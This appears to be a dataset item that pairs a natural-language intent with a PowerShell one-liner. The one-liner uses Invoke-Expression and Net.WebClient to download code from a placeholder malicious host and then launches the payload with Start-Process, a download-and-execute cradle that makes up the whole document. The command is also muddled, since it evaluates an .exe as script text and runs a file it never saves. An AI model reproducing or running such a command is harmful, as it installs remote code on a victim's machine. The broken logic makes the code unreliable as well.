# Natural language intent:
# Download and execute a malicious payload using Invoke-Expression and initiate a new process with the payload using Start-Process.

IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciouspayload.exe'); Start-Process maliciouspayload.exe
